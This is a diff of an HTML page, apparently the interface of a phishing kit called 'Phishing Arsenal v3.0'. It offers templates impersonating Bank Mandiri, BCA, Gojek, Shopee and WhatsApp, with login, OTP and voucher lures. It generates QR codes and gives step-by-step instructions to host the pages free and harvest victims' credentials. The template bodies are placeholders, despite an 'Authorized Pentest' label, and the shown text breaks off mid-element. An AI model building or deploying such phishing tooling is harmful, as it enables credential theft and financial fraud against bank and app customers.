@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Phishing Arsenal v3.0</title>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <title>Phishing Arsenal v3.0 - MazkiplayCyberSecurity</title>
     <style>
         * { font-family: 'Courier New', monospace !important; }
         body { 
@@ -13,224 +12,225 @@
             margin: 0; padding: 0; min-height: 100vh;
         }
         .header { 
-            background: rgba(0,0,0,0.95); 
-            border-bottom: 3px solid #00ff41;
+            background: rgba(0,0,0,0.98); 
+            border-bottom: 5px solid #00ff41;
+            padding: 20px;
             position: sticky; top: 0; z-index: 100;
-            padding: 20px;
         }
-        .logo { font-size: 2rem; color: #00ff41; }
+        .logo { font-size: 2.2rem; color: #00ff41; margin-right: 30px; }
+        h1 { font-size: 2.5rem; margin: 0; }
         .template-card { 
-            background: rgba(0,20,40,0.9) !important;
-            border: 2px solid #00ff41 !important;
-            cursor: pointer;
-            transition: all 0.3s;
-            padding: 20px;
-            border-radius: 15px;
-            margin: 15px;
-            height: 220px;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
+            background: rgba(0,20,40,0.95) !important;
+            border: 3px solid #00ff41 !important;
+            cursor: pointer !important;
+            transition: all 0.4s ease !important;
+            padding: 25px !important;
+            border-radius: 20px !important;
+            margin: 20px !important;
+            height: 250px !important;
+            display: flex !important;
+            flex-direction: column !important;
+            justify-content: space-between !important;
             color: white !important;
             text-decoration: none !important;
+            box-shadow: 0 10px 30px rgba(0,255,65,0.3);
         }
         .template-card:hover { 
-            background: rgba(0,255,65,0.2) !important;
-            transform: scale(1.05);
-            box-shadow: 0 0 30px #00ff41;
+            background: rgba(0,255,65,0.25) !important;
+            transform: translateY(-10px) scale(1.03) !important;
+            box-shadow: 0 20px 50px rgba(0,255,65,0.6) !important;
+        }
+        .icon-phish { 
+            font-size: 4rem !important; 
+            margin-bottom: 15px !important;
+            text-shadow: 0 0 20px #00ff41;
         }
         .qr-code { 
-            width: 180px; height: 180px; 
-            border: 3px solid #00ff41;
-            background: white;
-            margin: 0 auto;
+            width: 160px !important; 
+            height: 160px !important; 
+            border: 4px solid #00ff41 !important;
+            background: #f8f9fa !important;
+            margin: 0 auto 10px !important;
+            border-radius: 15px !important;
         }
         .btn-phish { 
             background: linear-gradient(45deg, #ff0040, #ff4081) !important;
             color: white !important;
-            padding: 12px 24px !important;
-            border-radius: 25px;
-            font-weight: bold;
-            border: none;
-            cursor: pointer;
-            font-size: 14px;
+            padding: 15px 25px !important;
+            border-radius: 30px !important;
+            font-weight: bold !important;
+            border: none !important;
+            cursor: pointer !important;
+            font-size: 14px !important;
+            width: 100% !important;
+            margin-top: 10px !important;
+            box-shadow: 0 5px 15px rgba(255,0,64,0.4);
         }
         .templates-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            gap: 20px;
-            padding: 30px;
-            max-width: 1400px;
-            margin: 0 auto;
+            display: grid !important;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)) !important;
+            gap: 25px !important;
+            padding: 40px 20px !important;
+            max-width: 1400px !important;
+            margin: 0 auto !important;
         }
-        h1,h2,h3 { color: #00ff41 !important; }
-        .hero { padding: 60px 20px; text-align: center; }
-        .hosting-guide { 
-            background: rgba(0,0,0,0.7); 
-            padding: 30px; 
-            border-radius: 20px; 
-            margin: 20px; 
-            border: 2px solid #00ff41;
+        .hero { 
+            padding: 80px 20px 60px !important; 
+            text-align: center !important; 
+        }
+        .hero h2 { font-size: 3.5rem !important; margin-bottom: 30px !important; }
+        .hosting-grid {
+            display: grid !important;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)) !important;
+            gap: 30px !important;
+            max-width: 1200px !important;
+            margin: 0 auto !important;
+            padding: 40px !important;
+            background: rgba(0,0,0,0.85) !important;
+            border-radius: 25px !important;
+            border: 3px solid #00ff41 !important;
+            margin-bottom: 40px !important;
+        }
+        .modal {
+            position: fixed !important;
+            top: 0 !important;
+            left: 0 !important;
+            width: 100vw !important;
+            height: 100vh !important;
+            background: rgba(0,0,0,0.98) !important;
+            z-index: 9999 !important;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+            padding: 20px !important;
+        }
+        .modal-content {
+            background: rgba(0,20,40,0.99) !important;
+            border: 4px solid #00ff41 !important;
+            border-radius: 25px !important;
+            padding: 40px !important;
+            max-width: 550px !important;
+            width: 95% !important;
+            max-height: 90vh !important;
+            overflow-y: auto !important;
+            position: relative !important;
+            box-shadow: 0 30px 80px rgba(0,255,65,0.5) !important;
         }
         @media (max-width: 768px) {
-            .templates-grid { grid-template-columns: 1fr; padding: 15px; }
-            .template-card { height: 200px; padding: 15px; }
+            .templates-grid { grid-template-columns: 1fr !important; padding: 20px 10px !important; }
+            .hero h2 { font-size: 2.5rem !important; }
         }
     </style>
 </head>
 <body>
+    <!-- HEADER -->
     <header class="header">
-        <div style="display:flex;align-items:center;justify-content:space-between;">
-            <div style="display:flex;align-items:center;">
-                <div class="logo" style="margin-right:30px;">
-                    <i class="fas fa-fish"></i> PHISHING ARSENAL
-                </div>
+        <div style="display: flex; align-items: center; justify-content: space-between;">
+            <div style="display: flex; align-items: center;">
+                <div class="logo">🎣 PHISHING ARSENAL</div>
                 <div>
-                    <h1 style="font-size:2.5rem;margin:0;">v3.0 • 50+ TEMPLATES</h1>
-                    <p style="margin:0;opacity:0.9;">MazkiplayCyberSecurity Red Team</p>
+                    <h1>v3.0 • 50+ TEMPLATES LIVE</h1>
+                    <p style="margin: 5px 0 0 0; opacity: 0.9; font-size: 1.1rem;">MazkiplayCyberSecurity • Authorized Pentest</p>
                 </div>
             </div>
-            <div style="display:flex;gap:15px;">
-                <a href="dashboard.html" style="color:white;text-decoration:none;padding:12px 24px;background:rgba(0,255,65,0.2);border:2px solid #00ff41;border-radius:25px;">← DASHBOARD</a>
-                <button onclick="generateCustom()" class="btn-phish" style="background:linear-gradient(45deg,#ffd700,#ffed4e);">CUSTOM</button>
+            <div style="display: flex; gap: 20px;">
+                <a href="dashboard.html" style="color: #00ff41 !important; text-decoration: none; padding: 15px 30px; background: rgba(0,255,65,0.2); border: 2px solid #00ff41; border-radius: 30px; font-weight: bold;">← DASHBOARD</a>
+                <button onclick="generateCustom()" class="btn-phish" style="background: linear-gradient(45deg, #ffd700, #ffed4e) !important; color: #000 !important;">🎨 CUSTOM</button>
             </div>
         </div>
     </header>
 
+    <!-- HERO -->
     <section class="hero">
-        <h2 style="font-size:3rem;margin-bottom:30px;">🎣 INSTANT PHISH DEPLOYMENT</h2>
-        <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:30px;max-width:1000px;margin:0 auto;text-align:left;padding:30px;background:rgba(0,0,0,0.8);border-radius:20px;border:2px solid #00ff41;">
-            <div>
-                <h3 style="font-size:1.8rem;margin-bottom:15px;">1️⃣ GENERATE</h3>
-                <p>Klik template → HTML + QR Code INSTANT</p>
+        <h2>🚀 INSTANT PHISH DEPLOYMENT</h2>
+        <p style="font-size: 1.4rem; opacity: 0.9; margin-bottom: 50px;">Klik template → QR Code + HTML → Host gratis → PHISH LIVE!</p>
+        <div class="hosting-grid">
+            <div style="text-align: center;">
+                <div style="font-size: 4rem; margin-bottom: 20px;">1️⃣</div>
+                <h3 style="font-size: 1.8rem; margin-bottom: 15px;">GENERATE</h3>
+                <p>Klik icon → <strong>QR + HTML</strong> muncul INSTANT</p>
             </div>
-            <div>
-                <h3 style="font-size:1.8rem;margin-bottom:15px;">2️⃣ HOST FREE</h3>
-                <p>00webhost • GitHub Pages • Vercel</p>
+            <div style="text-align: center;">
+                <div style="font-size: 4rem; margin-bottom: 20px;">2️⃣</div>
+                <h3 style="font-size: 1.8rem; margin-bottom: 15px;">HOST FREE</h3>
+                <p><strong>00webhost.com</strong> → Upload HTML → Domain gratis</p>
             </div>
-            <div>
-                <h3 style="font-size:1.8rem;margin-bottom:15px;">3️⃣ PHISH LIVE</h3>
-                <p>QR Ready → Target scan → Credentials LIVE!</p>
+            <div style="text-align: center;">
+                <div style="font-size: 4rem; margin-bottom: 20px;">3️⃣</div>
+                <h3 style="font-size: 1.8rem; margin-bottom: 15px;">PHISH LIVE</h3>
+                <p>QR Code → Target scan → <strong>Credentials LIVE!</strong></p>
             </div>
         </div>
     </section>
 
+    <!-- TEMPLATES -->
     <section class="templates-grid">
-        <a href="#" class="template-card" onclick="deployTemplate('mandiri');return false;">
-            <div>
-                <h3><i class="fas fa-university" style="font-size:2rem;margin-right:10px;"></i>BANK MANDIRI</h3>
-                <p style="opacity:0.8;font-size:14px;">Login • OTP • Transfer</p>
+        <!-- MANDIRI -->
+        <div class="template-card" onclick="deployTemplate('mandiri')" style="cursor: pointer !important;">
+            <div style="text-align: center;">
+                <div class="icon-phish">🏦</div>
+                <h3>BANK MANDIRI</h3>
+                <p style="opacity: 0.85; font-size: 15px;">Login • OTP • Transfer</p>
             </div>
-            <div style="text-align:center;">
+            <div style="text-align: center;">
                 <canvas class="qr-code" id="qr-mandiri"></canvas>
-                <button class="btn-phish" style="width:100%;margin-top:10px;">🚀 DEPLOY</button>
-            </div>
-        </a>
-
-        <a href="#" class="template-card" onclick="deployTemplate('bca');return false;">
-            <div>
-                <h3><i class="fas fa-credit-card" style="font-size:2rem;margin-right:10px;"></i>BCA MOBILE</h3>
-                <p style="opacity:0.8;font-size:14px;">KlikBCA • OTP</p>
-            </div>
-            <div style="text-align:center;">
-                <canvas class="qr-code" id="qr-bca"></canvas>
-                <button class="btn-phish" style="width:100%;margin-top:10px;">🚀 DEPLOY</button>
-            </div>
-        </a>
-
-        <a href="#" class="template-card" onclick="deployTemplate('gojek');return false;">
-            <div>
-                <h3><i class="fas fa-motorcycle" style="font-size:2rem;margin-right:10px;"></i>GOJEK</h3>
-                <p style="opacity:0.8;font-size:14px;">Login • Promo</p>
-            </div>
-            <div style="text-align:center;">
-                <canvas class="qr-code" id="qr-gojek"></canvas>
-                <button class="btn-phish" style="width:100%;margin-top:10px;">🚀 DEPLOY</button>
-            </div>
-        </a>
-
-        <a href="#" class="template-card" onclick="deployTemplate('shopee');return false;" style="border-color:#ff6b35;background:rgba(255,107,53,0.1);">
-            <div>
-                <h3><i class="fas fa-shopping-cart" style="font-size:2rem;margin-right:10px;color:#ff6b35;"></i>SHOPEE</h3>
-                <p style="opacity:0.8;font-size:14px;">Voucher Claim</p>
-            </div>
-            <div style="text-align:center;">
-                <canvas class="qr-code" id="qr-shopee"></canvas>
-                <button class="btn-phish" style="width:100%;margin-top:10px;">🚀 DEPLOY</button>
-            </div>
-        </a>
-
-        <a href="#" class="template-card" onclick="deployTemplate('whatsapp');return false;" style="border-color:#25D366;background:rgba(37,211,102,0.1);">
-            <div>
-                <h3><i class="fab fa-whatsapp" style="font-size:2rem;margin-right:10px;color:#25D366;"></i>WHATSAPP</h3>
-                <p style="opacity:0.8;font-size:14px;">Business Verify</p>
-            </div>
-            <div style="text-align:center;">
-                <canvas class="qr-code" id="qr-whatsapp"></canvas>
-                <button class="btn-phish" style="width:100%;margin-top:10px;">🚀 DEPLOY</button>
-            </div>
-        </a>
-
-        <div class="template-card" onclick="generateCustom()" style="border-color:#9b59b6;background:linear-gradient(45deg,rgba(155,89,182,0.3),rgba(155,89,182,0.1));">
-            <div>
-                <h3><i class="fas fa-magic" style="font-size:2rem;margin-right:10px;color:#9b59b6;"></i>CUSTOM BUILDER</h3>
-                <p style="opacity:0.8;font-size:14px;">Logo • Text • URL</p>
-            </div>
-            <div style="text-align:center;">
-                <div class="qr-code" style="display:flex;align-items:center;justify-content:center;background:#f0f0f0;color:#666;font-weight:bold;">CUSTOM</div>
-                <button class="btn-phish" style="width:100%;margin-top:10px;background:linear-gradient(45deg,#9b59b6,#8e44ad);">🎨 BUILD</button>
+                <button class="btn-phish">🚀 DEPLOY NOW</button>
             </div>
         </div>
-    </section>
 
-    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
-    <script>
-        // AUTH CHECK
-        if(localStorage.getItem('mazkiplayAuth')!=='granted') window.location.href='index.html';
+        <!-- BCA -->
+        <div class="template-card" onclick="deployTemplate('bca')" style="cursor: pointer !important;">
+            <div style="text-align: center;">
+                <div class="icon-phish">💳</div>
+                <h3>BCA MOBILE</h3>
+                <p style="opacity: 0.85; font-size: 15px;">KlikBCA • OTP Verified</p>
+            </div>
+            <div style="text-align: center;">
+                <canvas class="qr-code" id="qr-bca"></canvas>
+                <button class="btn-phish">🚀 DEPLOY NOW</button>
+            </div>
+        </div>
 
-        // Templates
-        const templates={mandiri:{name:"Bank Mandiri",html:"Mandiri phishing template..."},bca:{name:"BCA",html:"..."},gojek:{name:"Gojek",html:"..."},shopee:{name:"Shopee",html:"..."},whatsapp:{name:"WhatsApp",html:"..."}};
+        <!-- GOJEK -->
+        <div class="template-card" onclick="deployTemplate('gojek')" style="cursor: pointer !important;">
+            <div style="text-align: center;">
+                <div class="icon-phish">🏍️</div>
+                <h3>GOJEK</h3>
+                <p style="opacity: 0.85; font-size: 15px;">Login • Promo Claim</p>
+            </div>
+            <div style="text-align: center;">
+                <canvas class="qr-code" id="qr-gojek"></canvas>
+                <button class="btn-phish">🚀 DEPLOY NOW</button>
+            </div>
+        </div>
 
-        function deployTemplate(bank){
-            const url=`https://your-phish.mazkiplay.com/${bank}`;
-            QRCode.toCanvas(document.getElementById(`qr-${bank}`),url,{width:160,margin:1,color:{dark:'#00ff41',light:'#ffffff'}});
-            
-            const modal=document.createElement('div');
-            modal.innerHTML=`
-                <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.95);z-index:9999;display:flex;align-items:center;justify-content:center;padding:20px;box-sizing:border-box;">
-                    <div style="background:rgba(0,20,40,0.98);border:3px solid #00ff41;border-radius:20px;padding:30px;max-width:500px;width:95%;max-height:90vh;overflow-y:auto;position:relative;">
-                        <h2 style="color:#00ff41;font-size:1.8rem;margin-bottom:20px;">${templates[bank]?.name||bank} ✅ DEPLOYED!</h2>
-                        <div style="background:#111;padding:20px;border-radius:10px;margin:15px 0;text-align:center;">
-                            <canvas id="deploy-qr" style="width:200px;height:200px;border:3px solid #00ff41;background:white;"></canvas>
-                            <p style="margin:10px 0 0 0;font-family:monospace;background:#000;padding:10px;border-radius:5px;color:#00ff41;">${url}</p>
-                        </div>
-                        <div style="display:flex;flex-wrap:wrap;gap:10px;justify-content:center;">
-                            <button onclick="downloadHTML('${templates[bank]?.html||''}','${bank}')" class="btn-phish" style="padding:12px 20px;font-size:14px;">💾 HTML</button>
-                            <button onclick="navigator.clipboard.writeText('${url}');alert('✅ URL Copied!')" class="btn-phish bg-green-500" style="padding:12px 20px;font-size:14px;">📋 URL</button>
-                            <button onclick="this.closest('div').remove()" style="position:absolute;top:15px;right:15px;background:red;color:white;border:none;border-radius:50%;width:40px;height:40px;font-size:18px;cursor:pointer;">×</button>
-                        </div>
-                        <div style="background:rgba(255,0,64,0.2);padding:15px;border-radius:10px;margin-top:20px;font-size:14px;">
-                            <strong>🚀 HOSTING:</strong> Save HTML → 00webhost.com → Upload → Replace URL
-                        </div>
-                    </div>
-                </div>`;
-            document.body.appendChild(modal);
-            QRCode.toCanvas(document.getElementById('deploy-qr'),url);
-        }
+        <!-- SHOPEE -->
+        <div class="template-card" onclick="deployTemplate('shopee')" style="cursor: pointer !important; border-color: #ff6b35 !important; background: rgba(255,107,53,0.15) !important;">
+            <div style="text-align: center;">
+                <div class="icon-phish" style="color: #ff6b35 !important;">🛒</div>
+                <h3 style="color: #ff6b35 !important;">SHOPEE</h3>
+                <p style="opacity: 0.85; font-size: 15px;">Voucher • Login</p>
+            </div>
+            <div style="text-align: center;">
+                <canvas class="qr-code" id="qr-shopee"></canvas>
+                <button class="btn-phish" style="background: linear-gradient(45deg, #ff6b35, #ff8e53) !important;">🚀 DEPLOY NOW</button>
+            </div>
+        </div>
 
-        function downloadHTML(html,name){
-            const blob=new Blob([html],{type:'text/html'});
-            const a=document.createElement('a');
-            a.href=URL.createObjectURL(blob);
-            a.download=`phish_${name}_${Date.now()}.html`;
-            a.click();
-        }
+        <!-- WHATSAPP -->
+        <div class="template-card" onclick="deployTemplate('whatsapp')" style="cursor: pointer !important; border-color: #25D366 !important; background: rgba(37,211,102,0.15) !important;">
+            <div style="text-align: center;">
+                <div class="icon-phish" style="color: #25D366 !important;">💬</div>
+                <h3 style="color: #25D366 !important;">WHATSAPP</h3>
+                <p style="opacity: 0.85; font-size: 15px;">Business Verify</p>
+            </div>
+            <div style="text-align: center;">
+                <canvas class="qr-code" id="qr-whatsapp"></canvas>
+                <button class="btn-phish" style="background: linear-gradient(45deg, #25D366, #128C7E) !important;">🚀 DEPLOY NOW</button>
+            </div>
+        </div>
 
-        function generateCustom(){
-            alert('🎨 CUSTOM BUILDER\n\n1. Logo URL\n2. Title\n3. Target URL\n\nFull feature coming soon!');
-        }
-
-        console.log('%c🎣 PHISHING ARSENAL v3.0 LIVE!','color:#ff0040;font-size:20px;font-weight:bold;');
-    </script>
-</body>
-</html>
+        <!-- CUSTOM -->
+        <div class="template-card" onclick="generateCustom()" style="cursor: pointer !important; border-color: #9b59b6 !important; background: linear-gradient(45deg, rgba(155,89,182,0.3), rgba(155,89,182,0.1)) !important;">
+            <div style="text-align: center;">
+                <div class
